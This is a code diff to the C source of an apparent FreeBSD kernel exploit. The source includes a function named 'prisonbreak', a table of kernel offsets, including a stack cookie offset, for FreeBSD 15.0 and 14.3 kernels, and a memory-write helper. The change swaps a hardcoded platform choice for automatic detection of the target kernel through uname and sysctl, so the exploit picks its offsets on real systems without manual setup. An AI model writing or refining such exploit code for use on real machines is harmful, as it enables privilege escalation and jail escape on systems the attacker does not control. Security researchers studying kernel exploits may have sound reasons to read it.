@@ -16,6 +16,7 @@
 #include <sys/types.h>
 #include <sys/user.h>
 #include <unistd.h>
+#include <sys/utsname.h>
 
 #define u_32_t unsigned int
 
@@ -46,7 +47,7 @@ struct print_msg {
   char msg[0];
 };
 
-enum { FBSD_15_RELEASE = 0, FBSD_14_DEBUG = 1, UNKNOWN = 2 };
+enum { FBSD_15_GENERIC = 0, FBSD_14_DEBUG = 1, PLATFORM_UNKNOWN = 2 };
 
 struct kernel_offsets {
   unsigned int stack_cookie_offset;
@@ -60,8 +61,8 @@ struct kernel_offsets {
 };
 
 /*
- * [0] FreeBSD 15.0-RELEASE
- * [1] FreeBSD 14.3-DEBUG
+ * [0] FreeBSD 15.0-RELEASE GENERIC
+ * [1] FreeBSD 14.3-RELEASE GENERIC-DEBUG
  */
 static const struct kernel_offsets koffsets[] = {
     /* FreeBSD 15.0-RELEASE */
@@ -183,8 +184,37 @@ unsigned long get_pargs() {
   return (unsigned long)kp.ki_args + 50;
 }
 
-/* XXX TODO, need to do a proper implementation based on uname() values */
-unsigned int get_platform_idx() { return FBSD_14_DEBUG; }
+unsigned int get_platform_idx() {
+  // Get the kernel config name (e.g. GENERIC, GENERIC-DEBUG, ...)
+  char kern_ident[256];
+  size_t kern_ident_len = sizeof(kern_ident);
+
+  if (sysctlbyname("kern.ident", kern_ident, &kern_ident_len, NULL, 0) == -1) {
+    return PLATFORM_UNKNOWN;
+  }
+
+  // Get the release (e.g. 14.3-RELEASE, 15.0-RELEASE, ...) via POSIX uname(2)
+  struct utsname u;
+  if (uname(&u) == -1) {
+    return PLATFORM_UNKNOWN;
+  }
+
+  /* FreeBSD 14.3 GENERIC-DEBUG*/
+  if (strcmp(u.release, "14.3-RELEASE") == 0) {
+    if (strcmp(kern_ident, "GENERIC-DEBUG") == 0) return FBSD_14_DEBUG;
+
+    return PLATFORM_UNKNOWN;
+  }
+
+  /* FreeBSD 15.0 GENERIC*/
+  if (strcmp(u.release, "15.0-RELEASE") == 0) {
+    if (strcmp(kern_ident, "GENERIC") == 0) return FBSD_15_GENERIC;
+
+    return PLATFORM_UNKNOWN;
+  }
+
+  return PLATFORM_UNKNOWN;
+}
 
 void write_uint64(char* ptr, unsigned int offset, uint64_t value) {
   char* dest = ptr + offset;
@@ -278,8 +308,8 @@ void* prisonbreak(void* arg) {
     exit(0);
   }
   unsigned int idx = get_platform_idx();
-  if (idx == UNKNOWN) {
-    printf("platform not supported for this exploit\n");
+  if (idx == PLATFORM_UNKNOWN) {
+    printf("Unsupported FreeBSD version and kernel configuration for this exploit\n");
     exit(0);
   }
   struct kernel_offsets ko = koffsets[idx];
